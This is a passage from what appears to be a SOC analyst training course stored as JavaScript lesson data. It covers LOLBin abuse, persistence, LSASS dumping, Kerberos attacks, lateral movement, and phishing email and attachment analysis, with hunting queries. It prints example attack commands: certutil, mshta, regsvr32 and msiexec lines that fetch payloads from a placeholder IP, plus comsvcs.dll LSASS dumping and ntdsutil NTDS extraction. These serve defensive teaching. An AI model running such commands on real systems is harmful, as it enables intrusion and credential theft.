    "Find common persistence mechanisms: Run keys, scheduled tasks, services, WMI subscriptions",
    "Hunt for these behaviors with SPL and KQL"
  ],
  html: `
<p>Modern attackers avoid dropping obvious malware when they can use tools already present on the system. This is called <b>living off the land</b>, and the binaries they abuse are <b>LOLBins</b> (catalogued by the LOLBAS project for Windows and GTFOBins for Linux). Because these tools are signed by Microsoft, hash-based detection is useless; you must detect <i>how</i> they are used.</p>

<h3>Know normal first</h3>
<table>
  <tr><th>Process</th><th>Normal parent</th><th>Normal count / path</th></tr>
  <tr><td>smss.exe</td><td>System</td><td>One master instance, C:\\Windows\\System32</td></tr>
  <tr><td>wininit.exe</td><td>smss.exe (exits)</td><td>One</td></tr>
  <tr><td>services.exe</td><td>wininit.exe</td><td>One</td></tr>
  <tr><td>lsass.exe</td><td>wininit.exe</td><td>One &mdash; anything else named lsass is malicious</td></tr>
  <tr><td>svchost.exe</td><td>services.exe</td><td>Many, always System32, always with <code>-k</code></td></tr>
  <tr><td>explorer.exe</td><td>userinit.exe (exits)</td><td>One per logged-on user</td></tr>
</table>
<p>Classic anomalies: <code>svchost.exe</code> with parent <code>explorer.exe</code>; <code>lsass.exe</code> in <code>C:\\Users\\Public</code>; look-alike names (<code>scvhost.exe</code>, <code>lsasss.exe</code>); <code>w3wp.exe</code> (IIS) or <code>sqlservr.exe</code> spawning <code>cmd.exe</code> (web shell or SQL injection command execution).</p>

<h3>LOLBin abuse examples</h3>
<pre><code>certutil.exe -urlcache -split -f http://198.51.100.40/a.txt C:\\Users\\Public\\a.exe     (download, T1105)
certutil.exe -decode payload.b64 payload.dll                                           (decode, T1140)
mshta.exe http://198.51.100.40/run.hta                                                 (T1218.005)
regsvr32.exe /s /n /u /i:http://198.51.100.40/file.sct scrobj.dll                      ("Squiblydoo", T1218.010)
rundll32.exe C:\\ProgramData\\x.dll,Start                                               (T1218.011)
bitsadmin /transfer job /download /priority high http://.../p.exe C:\\Temp\\p.exe        (T1197)
wmic process call create "powershell -enc ..."                                          (T1047)
msiexec /q /i http://198.51.100.40/pkg.msi                                              (T1218.007)
cmstp.exe /ni /s C:\\Users\\Public\\x.inf                                                 (UAC bypass, T1218.003)</code></pre>
<p>Pattern: a built-in tool reaching the internet, decoding content, or loading code from user-writable paths.</p>

<h3>Persistence mechanisms</h3>
<table>
  <tr><th>Mechanism</th><th>Where / evidence</th><th>ATT&amp;CK</th></tr>
  <tr><td>Run / RunOnce keys</td><td><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>; Sysmon 13</td><td>T1547.001</td></tr>
  <tr><td>Startup folder</td><td><code>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>; Sysmon 11</td><td>T1547.001</td></tr>
  <tr><td>Scheduled task</td><td>Security 4698, TaskScheduler/Operational 106; <code>schtasks /create</code></td><td>T1053.005</td></tr>
  <tr><td>New service</td><td>System 7045, Security 4697</td><td>T1543.003</td></tr>
  <tr><td>WMI event subscription</td><td>Sysmon 19/20/21; WMI-Activity 5861</td><td>T1546.003</td></tr>
  <tr><td>New local/domain account</td><td>4720, 4732/4728</td><td>T1136</td></tr>
  <tr><td>Remote access tools</td><td>AnyDesk, ScreenConnect, Atera installed unexpectedly</td><td>T1219</td></tr>
  <tr><td>Cloud persistence</td><td>New OAuth app consent, new MFA method, federation changes</td><td>T1098</td></tr>
</table>
<p>Sysinternals <b>Autoruns</b> (and <code>autorunsc -a * -h -s -c</code> for CSV) enumerates almost every auto-start location; it is a standard live-response collection.</p>

<h3>Hunting queries</h3>
<h4>SPL: LOLBins with network activity or download flags</h4>
<pre><code>index=sysmon EventCode=1
  (Image="*\\certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*-decode*"))
  OR (Image="*\\mshta.exe" CommandLine="*http*")
  OR (Image="*\\regsvr32.exe" CommandLine="*/i:http*")
  OR (Image="*\\bitsadmin.exe" CommandLine="*/transfer*")
| table _time host User ParentImage Image CommandLine</code></pre>
<h4>KQL: new Run-key persistence pointing to user-writable paths</h4>
<pre><code>DeviceRegistryEvents
| where Timestamp &gt; ago(7d) and ActionType == "RegistryValueSet"
| where RegistryKey has @"\\CurrentVersion\\Run"
| where RegistryValueData has_any (@"\\AppData\\", @"\\Temp\\", @"\\Users\\Public\\", @"\\ProgramData\\")
| project Timestamp, DeviceName, InitiatingProcessFileName, RegistryKey, RegistryValueName, RegistryValueData</code></pre>
<h4>KQL: services installed from unusual paths (7045)</h4>
<pre><code>Event
| where EventLog == "System" and EventID == 7045
| extend ImagePath = extract(@"Service File Name:\\s+(.*?)\\s+Service Type", 1, RenderedDescription)
| where ImagePath has_any ("cmd.exe /c", "powershell", @"\\Temp\\", @"\\Users\\", "%COMSPEC%")</code></pre>

<div class="callout tip"><b>Tip:</b> For every LOLBin alert, ask "what is the parent?" <code>certutil</code> launched by an SCCM agent during patching is noise; <code>certutil</code> launched by <code>wscript.exe</code> from a ZIP in Downloads is an incident.</div>

<div class="callout real"><b>On the job:</b> Ransomware affiliates commonly install legitimate remote management tools (AnyDesk, ScreenConnect, Splashtop) as a backup access path. Many SOCs maintain an "approved RMM" list and alert on any other RMM installation &mdash; a high-fidelity, low-noise detection.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.2 covers host-based indicators (unauthorized software, registry changes, scheduled tasks, unexpected processes). BTL1 and SC-200 both include persistence-hunting scenarios.</div>
`,
  keyTerms: [
    ["Living off the land", "Using legitimate built-in tools to perform attacker actions"],
    ["LOLBin", "Living-off-the-land binary such as certutil, mshta or rundll32"],
    ["LOLBAS / GTFOBins", "Projects documenting abusable Windows and Unix binaries"],
    ["Persistence", "Mechanism allowing attacker access to survive reboots or credential changes"],
    ["Run key", "Registry auto-start location executed at user logon"],
    ["WMI event subscription", "Fileless persistence triggering code on a WMI event"],
    ["Autoruns", "Sysinternals tool enumerating auto-start extensibility points"],
    ["RMM abuse", "Use of legitimate remote monitoring and management tools for attacker access"]
  ],
  standards: ["MITRE ATT&CK T1218", "MITRE ATT&CK T1547.001", "MITRE ATT&CK T1053.005", "MITRE ATT&CK T1543.003"],
  labs: ["lab-powershell-triage", "lab-windows-events"]
},
{
  id: "p2-m5-l3",
  module: "p2-m5",
  title: "Credential Theft and Lateral Movement Detection",
  minutes: 22,
  objectives: [
    "Detect LSASS credential dumping with Sysmon 10 and EDR telemetry",
    "Recognize pass-the-hash, pass-the-ticket, Kerberoasting and DCSync patterns",
    "Identify lateral movement via PsExec, WMI, WinRM and RDP in logs",
    "Map these to ATT&CK and appropriate containment steps"
  ],
  html: `
<p>After initial access, attackers almost always need better credentials. Domain admin, or equivalent cloud admin, is usually only a few steps away in a typical network. Catching <b>credential access</b> and <b>lateral movement</b> early is how you stop a single phished laptop from becoming company-wide ransomware.</p>

<h3>LSASS credential dumping (T1003.001)</h3>
<p>The Local Security Authority Subsystem Service (<code>lsass.exe</code>) holds credential material for logged-on users. Tools such as Mimikatz, procdump, comsvcs.dll MiniDump, nanodump and Task Manager "create dump file" read its memory.</p>
<pre><code>Sysmon EventID 10 (ProcessAccess)
SourceImage: C:\\Users\\Public\\pd64.exe
TargetImage: C:\\Windows\\System32\\lsass.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|...|UNKNOWN(00000000025A1C3B)</code></pre>
<p>Red flags: unexpected source process, <code>GrantedAccess</code> values such as <code>0x1010</code>, <code>0x1410</code>, <code>0x1FFFFF</code>, and <code>UNKNOWN</code> in the call trace (code running from unbacked memory). Also hunt for the command-line form:</p>
<pre><code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\l.dmp full</code></pre>
<p>Mitigations: <b>Credential Guard</b> (on by default on many Windows 11 enterprise devices), <b>LSA protection (RunAsPPL)</b>, the ASR rule "Block credential stealing from LSASS," and removing local admin rights.</p>

<h3>Kerberos and AD attacks</h3>
<table>
  <tr><th>Attack</th><th>Telemetry</th><th>ATT&amp;CK</th></tr>
  <tr><td><b>Kerberoasting</b> &mdash; request service tickets for SPN accounts, crack offline</td><td>Burst of 4769 with encryption type 0x17 (RC4) from one user</td><td>T1558.003</td></tr>
  <tr><td><b>AS-REP roasting</b> &mdash; accounts without pre-auth</td><td>4768 with pre-auth type 0</td><td>T1558.004</td></tr>
  <tr><td><b>Pass-the-hash</b> &mdash; NTLM hash reused</td><td>4624 type 9 with logon process seclogo on source; type 3 NTLM logons on target from unusual hosts</td><td>T1550.002</td></tr>
  <tr><td><b>Pass-the-ticket / Golden Ticket</b></td><td>TGS without matching TGT (4769 without 4768), abnormal ticket lifetimes, nonexistent users</td><td>T1550.003, T1558.001</td></tr>
  <tr><td><b>DCSync</b> &mdash; pretend to be a DC and replicate password hashes</td><td>4662 on a DC with replication GUIDs <code>1131f6aa-...</code> / <code>1131f6ad-...</code> from a non-DC account</td><td>T1003.006</td></tr>
  <tr><td><b>NTDS.dit theft</b></td><td><code>ntdsutil "ac i ntds" "ifm"</code>, vssadmin shadow copies on a DC</td><td>T1003.003</td></tr>
</table>

<h3>Lateral movement fingerprints</h3>
<table>
  <tr><th>Technique</th><th>Target-side evidence</th></tr>
  <tr><td><b>PsExec / SMB exec</b> (T1569.002, T1021.002)</td><td>4624 type 3, 7045 service <code>PSEXESVC</code> (or random name with Impacket), named pipes, ADMIN$ share access (5140/5145)</td></tr>
  <tr><td><b>WMI</b> (T1047)</td><td>Process with parent <code>WmiPrvSE.exe</code>; Impacket wmiexec writes output to <code>ADMIN$\\__&lt;timestamp&gt;</code></td></tr>
  <tr><td><b>WinRM / PowerShell Remoting</b> (T1021.006)</td><td>Parent <code>wsmprovhost.exe</code>; port 5985/5986; WinRM operational log 91</td></tr>
  <tr><td><b>RDP</b> (T1021.001)</td><td>4624 type 10; TerminalServices-RemoteConnectionManager 1149; LocalSessionManager 21/25</td></tr>
  <tr><td><b>Scheduled task remote</b></td><td>4698 on target with network logon just before</td></tr>
</table>

<h3>Queries</h3>
<h4>KQL: LSASS access by unusual processes (Defender XDR)</h4>
<pre><code>DeviceEvents
| where Timestamp &gt; ago(7d) and ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsMpEng.exe","csrss.exe","wininit.exe","svchost.exe","MsSense.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName</code></pre>
<h4>SPL: PsExec-style service installs across hosts</h4>
<pre><code>index=wineventlog source="WinEventLog:System" EventCode=7045
| stats values(Service_Name) AS services values(Service_File_Name) AS paths dc(host) AS hosts BY _time span=10m
| where hosts &gt; 3</code></pre>
<h4>SPL: one account authenticating to many hosts</h4>
<pre><code>index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM earliest=-1h
| stats dc(host) AS targets values(host) AS hosts BY Account_Name Source_Network_Address
| where targets &gt; 10</code></pre>

<div class="callout warn"><b>Warning:</b> When credentials are stolen, resetting the password once may not be enough. Kerberos tickets remain valid until expiry, cloud refresh tokens persist, and a stolen <code>krbtgt</code> hash requires resetting the krbtgt account <b>twice</b> (with replication between resets) to invalidate golden tickets. Always revoke sessions and tokens too.</div>

<div class="callout real"><b>On the job:</b> Tools like BloodHound show attack paths in AD. Defenders use it too: if your Tier 2 team knows that the helpdesk group has a path to Domain Admin through three nested groups, an alert on a helpdesk account suddenly becomes much higher priority.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 covers pass-the-hash, golden ticket and credential attacks as indicators; Security+ covers them conceptually. BTL1 may present 4624/4769 logs and ask you to name the attack.</div>
`,
  keyTerms: [
    ["LSASS", "Windows process holding credential material; prime target for dumping"],
    ["GrantedAccess", "Sysmon 10 field showing access rights requested on a target process"],
    ["Pass-the-hash", "Authenticating with an NTLM hash instead of the plaintext password"],
    ["Golden Ticket", "Forged Kerberos TGT created with the krbtgt account hash"],
    ["DCSync", "Abusing directory replication rights to pull password hashes from a DC"],
    ["Credential Guard", "Virtualization-based protection isolating LSASS secrets"],
    ["PsExec", "Sysinternals remote execution tool; creates the PSEXESVC service on targets"],
    ["Lateral movement", "Moving from one compromised system to others in the network"]
  ],
  standards: ["MITRE ATT&CK T1003", "MITRE ATT&CK T1550", "MITRE ATT&CK T1558", "MITRE ATT&CK T1021"],
  labs: ["lab-windows-events", "lab-attack-mapping"]
}
);

/* ===================== p2-m6 Phishing & Email Analysis ===================== */
CP.lessons.push(
{
  id: "p2-m6-l1",
  module: "p2-m6",
  title: "The Modern Phishing Landscape",
  minutes: 16,
  objectives: [
    "Classify phishing variants: spear phishing, whaling, BEC, smishing, vishing, quishing and callback phishing",
    "Explain AiTM credential phishing and OAuth consent phishing",
    "Recognize the social-engineering levers attackers use",
    "Describe the user-reported phishing triage flow"
  ],
  html: `
<p>Phishing remains one of the top initial access vectors year after year in breach reports (Verizon DBIR, Mandiant M-Trends), alongside stolen credentials and exploitation of edge devices. Email analysis is therefore a daily task for most SOC analysts, and a large share of the alerts in many queues are user-reported emails.</p>

<h3>Variants</h3>
<table>
  <tr><th>Type</th><th>Description</th></tr>
  <tr><td><b>Bulk phishing</b></td><td>Mass emails impersonating brands (Microsoft, DocuSign, DHL)</td></tr>
  <tr><td><b>Spear phishing</b></td><td>Targeted at specific people using researched context</td></tr>
  <tr><td><b>Whaling</b></td><td>Targets executives</td></tr>
  <tr><td><b>Business Email Compromise (BEC)</b></td><td>Impersonation or compromised mailbox used for payment fraud, invoice redirection or payroll diversion &mdash; often no link or attachment at all</td></tr>
  <tr><td><b>Thread hijacking</b></td><td>Attacker replies within a real, stolen email thread</td></tr>
  <tr><td><b>Smishing / vishing</b></td><td>SMS / voice phishing; often combined with helpdesk impersonation to reset MFA</td></tr>
  <tr><td><b>Quishing</b></td><td>QR code in an email or PDF that sends the victim to a phishing page on a phone, outside corporate protections</td></tr>
  <tr><td><b>Callback phishing (TOAD)</b></td><td>Fake invoice with a phone number; victim calls and is talked into installing remote access software</td></tr>
  <tr><td><b>Teams / chat phishing</b></td><td>External Teams messages or "IT support" chats following an email bombing campaign</td></tr>
</table>

<h3>Payload types</h3>
<ul>
  <li><b>Credential harvesting</b> &mdash; a fake login page. Modern kits are <b>adversary-in-the-middle (AiTM)</b> reverse proxies (Evilginx, Tycoon 2FA, and other phishing-as-a-service kits) that relay the real Microsoft or Google login and steal the session cookie, defeating SMS, app push and OTP MFA. Phishing-resistant MFA (FIDO2 passkeys, Windows Hello for Business, certificate-based) stops this.</li>
  <li><b>Malware delivery</b> &mdash; since Microsoft blocked macros from the internet by default (2022), attackers moved to ZIP/ISO/IMG containers, LNK shortcuts, OneNote files, HTML smuggling, SVG attachments with embedded scripts, and links to cloud-hosted payloads.</li>
  <li><b>OAuth consent phishing</b> &mdash; the victim is asked to grant a malicious app permissions (e.g., Mail.Read) to their account. No password is stolen, and resetting the password does not remove access; you must revoke the app consent.</li>
  <li><b>Device code phishing</b> &mdash; the victim enters an attacker-supplied code at the legitimate microsoft.com/devicelogin page, granting tokens to the attacker.</li>
</ul>

<h3>Social engineering levers</h3>
<p>Urgency ("your account will be deleted today"), authority (CEO, IT, legal), fear (security alert, overdue invoice), curiosity (shared document, voicemail), reward (bonus, refund), and familiarity (a known vendor). Generative AI has eliminated the typos and bad grammar that training used to teach people to look for, so focus training and analysis on <i>context</i>: is this request expected, from this sender, through this channel?</p>

<h3>User-reported phishing triage</h3>
<ol>
  <li><b>Receive</b> the report (Report button, phishing mailbox) with the <i>original message as an attachment</i> (.eml/.msg) so headers are preserved.</li>
  <li><b>Classify quickly</b>: spam/marketing, simulation (check your phishing-sim vendor headers), or suspicious.</li>
  <li><b>Analyze</b> headers, sender, links and attachments (next lessons).</li>
  <li><b>Scope</b>: who else received it? Did anyone click, submit credentials or open the attachment?</li>
  <li><b>Respond</b>: purge copies, block sender/domain/URLs, reset and revoke for anyone who submitted credentials, isolate hosts that executed payloads.</li>
  <li><b>Close the loop</b> with the reporter &mdash; positive feedback increases future reporting.</li>
</ol>

<div class="callout tip"><b>Tip:</b> The most important question in any phishing case is <b>"did anyone interact?"</b> A malicious email that 300 people received but nobody clicked is a cleanup task; one click with a credential submission is a potential account compromise that needs immediate action.</div>

<div class="callout real"><b>On the job:</b> BEC is one of the costliest cybercrimes measured by the FBI's IC3 reports, with billions of dollars in reported losses annually. Many BEC emails contain no malicious content at all, so they slip past filters. Out-of-band verification of any payment or bank detail change is the key control.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.2 and 2.x include email-based indicators; Security+ SY0-701 covers the phishing variants by name. BTL1 has an entire Phishing Analysis domain covering classification, headers, artifacts and response.</div>
`,
  keyTerms: [
    ["Spear phishing", "Targeted phishing using researched personal or business context"],
    ["BEC", "Business Email Compromise: fraud using impersonated or compromised business email"],
    ["Quishing", "Phishing using QR codes to move victims to unmanaged mobile devices"],
    ["Callback phishing", "Lure that prompts the victim to phone the attacker, often leading to remote access installation"],
    ["AiTM phishing", "Reverse-proxy phishing that captures session cookies and bypasses non-phishing-resistant MFA"],
    ["OAuth consent phishing", "Tricking a user into granting a malicious application access to their account"],
    ["HTML smuggling", "Embedding an encoded payload in HTML/JavaScript that is assembled in the browser"],
    ["Phishing-resistant MFA", "Authentication bound to the origin, such as FIDO2 passkeys, that cannot be relayed"]
  ],
  standards: ["MITRE ATT&CK T1566", "MITRE ATT&CK T1528", "MITRE ATT&CK T1557"],
  labs: ["lab-phishing"]
},
{
  id: "p2-m6-l2",
  module: "p2-m6",
  title: "Email Header Analysis: SPF, DKIM and DMARC",
  minutes: 24,
  objectives: [
    "Read Received headers bottom-up to trace an email's path",
    "Distinguish envelope sender (Return-Path), header From and Reply-To",
    "Interpret SPF, DKIM, DMARC and ARC results in Authentication-Results",
    "Identify spoofing and look-alike domains from header evidence"
  ],
  html: `
<p>The visible part of an email is easy to fake. The headers record what servers actually did with it. Learning to read headers lets you answer: where did this really come from, and was it authenticated?</p>

<h3>Three different "senders"</h3>
<table>
  <tr><th>Field</th><th>What it is</th><th>Checked by</th></tr>
  <tr><td><b>Envelope sender</b> (MAIL FROM, recorded as <code>Return-Path</code>)</td><td>Where bounces go; used in the SMTP conversation</td><td>SPF</td></tr>
  <tr><td><b>Header From</b> (<code>From:</code>)</td><td>What the user sees</td><td>DMARC alignment</td></tr>
  <tr><td><b>Reply-To</b></td><td>Where replies go</td><td>Nothing &mdash; a mismatch with From is a BEC red flag</td></tr>
</table>

<h3>Sample headers</h3>
<pre><code>Return-Path: &lt;bounce-77812@mailer.inv0ice-portal.example&gt;
Received: from mx.contoso.com (10.20.1.5) by EXCH02.contoso.com; Tue, 14 Oct 2026 14:02:13 +0000
Received: from mail.inv0ice-portal.example (203.0.113.88) by mx.contoso.com with ESMTPS
        id 4Xk2; Tue, 14 Oct 2026 14:02:11 +0000
Authentication-Results: mx.contoso.com;
        spf=pass (sender IP is 203.0.113.88) smtp.mailfrom=mailer.inv0ice-portal.example;
        dkim=pass header.d=inv0ice-portal.example;
        dmarc=fail action=quarantine header.from=contoso-payments.com;
        compauth=fail reason=000
From: "Contoso Accounts Payable" &lt;ap@contoso-payments.com&gt;
Reply-To: ap.contoso@protonmail.example
To: m.lee@contoso.com
Subject: URGENT: Updated remittance details - Invoice 44821
Date: Tue, 14 Oct 2026 14:02:05 +0000
Message-ID: &lt;20261014140205.8812@mailer.inv0ice-portal.example&gt;
X-Mailer: PHPMailer 6.9.1</code></pre>

<h3>Reading it</h3>
<ol>
  <li><b>Received headers are read bottom-up.</b> Each server adds its own on top. The lowest one added by <i>your</i> trusted border server (mx.contoso.com) shows the real connecting IP: <code>203.0.113.88</code>. Anything below that can be forged by the sender.</li>
  <li><b>SPF passed</b> &mdash; but for <code>mailer.inv0ice-portal.example</code>, the attacker's own domain (note the zero). SPF only proves the IP may send for the envelope domain.</li>
  <li><b>DKIM passed</b> &mdash; also for the attacker's domain. DKIM proves the message was signed by <code>d=</code> and not modified.</li>
  <li><b>DMARC failed</b> &mdash; because neither the SPF domain nor the DKIM domain <i>aligns</i> with the visible From domain <code>contoso-payments.com</code>. This is the result that matters.</li>
  <li><b>Reply-To</b> goes to a free webmail address: classic BEC.</li>
  <li><b>X-Mailer: PHPMailer</b> &mdash; a scripted bulk mailer, not a corporate mail system.</li>
  <li><b>Look-alike domains</b>: <code>contoso-payments.com</code> is not <code>contoso.com</code>; check registration age with WHOIS/RDAP.</li>
</ol>

<h3>SPF, DKIM, DMARC explained</h3>
<h4>SPF (RFC 7208)</h4>
<pre><code>contoso.com. TXT "v=spf1 include:spf.protection.outlook.com ip4:198.51.100.0/24 -all"</code></pre>
<p>Lists IPs allowed to send for a domain. <code>-all</code> = hard fail others; <code>~all</code> = soft fail. Limits: max 10 DNS lookups; breaks on forwarding; checks only the envelope domain.</p>
<h4>DKIM (RFC 6376)</h4>
<pre><code>DKIM-Signature: v=1; a=rsa-sha256; d=contoso.com; s=selector1; h=from:to:subject:date; bh=...; b=...
selector1._domainkey.contoso.com. TXT "v=DKIM1; k=rsa; p=MIIBIjANBgkq..."</code></pre>
<p>The sending server signs selected headers and the body hash with a private key; receivers fetch the public key from DNS using the selector (<code>s=</code>) and domain (<code>d=</code>). Survives forwarding if the message is not modified.</p>
<h4>DMARC (RFC 7489; DMARCbis in progress at the IETF)</h4>
<pre><code>_dmarc.contoso.com. TXT "v=DMARC1; p=reject; rua=mailto:dmarc@contoso.com; adkim=s; aspf=r; pct=100"</code></pre>
<p>DMARC passes if <b>SPF or DKIM passes AND is aligned</b> with the header From domain. Policy <code>p=none</code> (monitor), <code>quarantine</code> or <code>reject</code>. <code>rua</code> receives aggregate reports. Since 2024, Google and Yahoo (and Microsoft for Outlook.com consumers since 2025) require bulk senders to have SPF, DKIM and at least <code>p=none</code> DMARC.</p>
<h4>ARC (RFC 8617)</h4>
<p>Authenticated Received Chain lets intermediaries such as mailing lists record authentication results they saw before modifying a message, so the final receiver can trust a chain of custody. Seen as <code>ARC-Seal</code>, <code>ARC-Message-Signature</code> and <code>ARC-Authentication-Results</code>.</p>

<div class="callout warn"><b>Warning:</b> "SPF pass" and "DKIM pass" do not mean "legitimate." Attackers register their own domains and set up perfect SPF and DKIM in minutes. Always check <i>which domain</i> passed and whether it aligns with what the user sees.</div>

<h3>Hunting across mailboxes</h3>
<pre><code>KQL (Defender for Office 365):
EmailEvents
| where Timestamp &gt; ago(7d)
| where SenderFromDomain == "contoso-payments.com" or SenderIPv4 == "203.0.113.88"
| project Timestamp, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation, AuthenticationDetails, NetworkMessageId

SPL (mail gateway logs):
index=email (sender_domain="contoso-payments.com" OR src_ip="203.0.113.88") earliest=-7d
| stats count values(recipient) AS recipients values(subject) AS subjects BY sender action</code></pre>

<div class="callout tip"><b>Tip:</b> Tools that speed this up: Microsoft Message Header Analyzer, Google Admin Toolbox Messageheader, MXToolbox header analyzer, and CyberChef. Paste headers only into tools approved by your organization, since headers contain internal hostnames and addresses.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 tests SPF/DKIM/DMARC purpose and header interpretation (objective 1.2 email indicators). BTL1's phishing domain expects you to extract the sending IP, Return-Path, Reply-To and authentication results from raw headers.</div>
`,
  keyTerms: [
    ["Return-Path", "Envelope sender address used for bounces and checked by SPF"],
    ["Received header", "Trace header added by each mail server; read bottom-up"],
    ["SPF", "Sender Policy Framework: DNS list of IPs authorized to send for a domain"],
    ["DKIM", "DomainKeys Identified Mail: cryptographic signature tied to a domain"],
    ["DMARC", "Policy requiring SPF or DKIM to pass and align with the From domain"],
    ["Alignment", "Match between the authenticated domain (SPF/DKIM) and the visible From domain"],
    ["ARC", "Authenticated Received Chain preserving authentication results across intermediaries"],
    ["Look-alike domain", "Domain crafted to resemble a legitimate one (typosquatting, homoglyphs)"]
  ],
  standards: ["RFC 5321", "RFC 5322", "RFC 7208", "RFC 6376", "RFC 7489", "RFC 8617"],
  labs: ["lab-phishing"]
},
{
  id: "p2-m6-l3",
  module: "p2-m6",
  title: "Analyzing Links and Attachments, and Responding",
  minutes: 22,
  objectives: [
    "Safely extract, defang and analyze URLs and attachments",
    "Use reputation services and sandboxes appropriately (and know their OPSEC risks)",
    "Scope a phishing campaign and identify users who interacted",
    "Execute a phishing response including purge, block and account remediation"
  ],
  html: `
<p>Headers tell you where an email came from; the links and attachments tell you what it wanted to do. This lesson covers safe artifact analysis and the response that follows.</p>

<h3>Safe handling rules</h3>
<ul>
  <li>Analyze in an isolated VM or a dedicated analysis environment, never on your daily workstation.</li>
  <li><b>Defang</b> indicators in tickets and chat: <code>hxxps://login-micros0ft[.]example/auth</code>, <code>203.0.113[.]88</code>. This prevents accidental clicks and auto-linking.</li>
  <li>Never reply to, forward, or click from the original email. Copy URLs from the raw source.</li>
  <li>Remember that unique URLs may contain the victim's email address encoded (often Base64) &mdash; visiting them tells the attacker the target is live.</li>
</ul>

<h3>URL analysis</h3>
<pre><code>Visible text:  https://sharepoint.contoso.com/finance/Q3-review
Actual href:   https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fr.example-cdn.net%2Fre%2F%3Fu%3DbS5sZWVAY29udG9zby5jb20%3D...
Decoded:       https://r.example-cdn.net/re/?u=bS5sZWVAY29udG9zby5jb20=     ("m.lee@contoso.com" in Base64)
Redirects to:  https://contoso-sso.login-portal.example/common/oauth2/...   (AiTM kit)</code></pre>
<p>Steps: unwrap safe-link and URL-shortener wrappers, decode parameters, follow redirects <i>passively</i> (urlscan.io, a sandbox, or <code>curl -sI</code> from an isolated host), then assess: domain age (RDAP/WHOIS), TLS certificate issuance time (crt.sh certificate transparency), hosting ASN, page screenshot, and whether the page loads a known phishing kit. Abuse of legitimate services (Cloudflare Workers/Pages, Google Docs, Dropbox, Canva, Microsoft Forms) is common, so reputation alone often says "clean."</p>

<div class="callout warn"><b>Warning:</b> Public scanners such as urlscan.io and VirusTotal may make your submission visible to others, including the attacker. Use private/unlisted scan options for targeted attacks, and never upload internal documents or files that might contain sensitive data to public sandboxes.</div>

<h3>Attachment analysis</h3>
<ol>
  <li><b>Identify the real type</b> by magic bytes, not extension: <code>file invoice.pdf</code>, or check headers (PDF = <code>%PDF</code>, ZIP/OOXML = <code>PK</code>, PE = <code>MZ</code>, OLE = <code>D0 CF 11 E0</code>).</li>
  <li><b>Hash it</b> (<code>sha256sum</code> or <code>Get-FileHash</code>) and look up the hash first &mdash; a lookup does not reveal the file.</li>
  <li><b>Static triage</b>:
    <ul>
      <li>Office: <code>olevba</code> / <code>oleid</code> (oletools) for macros, external template injection (<code>attachedTemplate</code> pointing to a URL).</li>
      <li>PDF: <code>pdfid.py</code> and <code>pdf-parser.py</code> for <code>/JavaScript</code>, <code>/OpenAction</code>, <code>/Launch</code>, embedded URIs and QR images.</li>
      <li>HTML/SVG: look for large Base64 blobs, <code>atob()</code>, <code>window.location</code>, and form posts to external domains.</li>
      <li>ZIP/ISO/IMG: list contents; LNK, JS, VBS, HTA, CHM, MSI, or a DLL plus a signed EXE (side-loading) are red flags. Inspect LNK targets with <code>LECmd</code>.</li>
    </ul>
  </li>
  <li><b>Dynamic analysis</b> in a sandbox (Any.Run, Joe Sandbox, Hybrid Analysis, CAPE, Defender detonation) to observe network callbacks and dropped files.</li>
</ol>
<pre><code>$ olevba Invoice_44821.docm
| AutoExec   | AutoOpen          | Runs when the Word document is opened
| Suspicious | Shell             | May run an executable file or a system command
| Suspicious | CreateObject      | May create an OLE object
| IOC        | http://198.51.100.40/s.ps1 | URL</code></pre>

<h3>Scoping: who else, and who clicked?</h3>
<pre><code>KQL - recipients and clicks:
let mid = EmailEvents
  | where Timestamp &gt; ago(3d) and Subject has "remittance details" and SenderFromDomain == "contoso-payments.com"
  | distinct NetworkMessageId;
EmailEvents | where NetworkMessageId in (mid)
| join kind=leftouter (UrlClickEvents | project NetworkMessageId, AccountUpn, Url, ActionType, ClickTime = Timestamp) on NetworkMessageId
| project RecipientEmailAddress, DeliveryLocation, Url, ActionType, ClickTime

SPL - proxy hits on the phishing domain:
index=proxy url="*login-portal.example*" earliest=-3d
| stats earliest(_time) AS first count values(http_method) AS methods BY user src_ip
| convert ctime(first)</code></pre>
<p>A <b>POST</b> to the phishing domain usually means credentials were submitted. Then check that user's sign-in logs for new IPs and sessions in the following minutes.</p>

<h3>Response checklist</h3>
<ol>
  <li><b>Purge</b> all copies (Defender: Threat Explorer &rarr; Soft delete, or <code>New-ComplianceSearchAction -Purge</code>; Google Workspace: investigation tool).</li>
  <li><b>Block</b> sender, domain, URLs and hashes in mail filter, proxy/DNS and EDR.</li>
  <li><b>For users who submitted credentials</b>: reset password, <b>revoke all sessions/refresh tokens</b> (<code>Revoke-MgUserSignInSession</code>), review and remove attacker-added MFA methods, inbox rules, forwarding and OAuth consents.</li>
  <li><b>For users who ran attachments</b>: isolate the endpoint and investigate with EDR.</li>
  <li><b>Report</b> the phishing site to the hosting provider/registrar and to services like Microsoft or Google Safe Browsing.</li>
  <li><b>Document</b> IOCs and share internally (and with your ISAC if appropriate).</li>
</ol>

<div class="callout real"><b>On the job:</b> Check for malicious inbox rules after every credential phish. Attackers routinely create rules that move emails containing words like "invoice," "payment," "phish" or "security" to RSS Feeds or Archive, so the victim never sees warnings or replies from the real vendor.</div>

<div class="callout exam"><b>Exam alignment:</b> BTL1 phishing domain: artifact collection, defanging, URL and attachment analysis, and defensive measures (blocking, purging) are all tested. CySA+ CS0-003 asks about sandboxing and safe analysis practices.</div>
`,
  keyTerms: [
    ["Defanging", "Altering an indicator (hxxp, [.]) so it cannot be clicked or resolved accidentally"],
    ["Magic bytes", "File signature at the start of a file identifying its true type"],
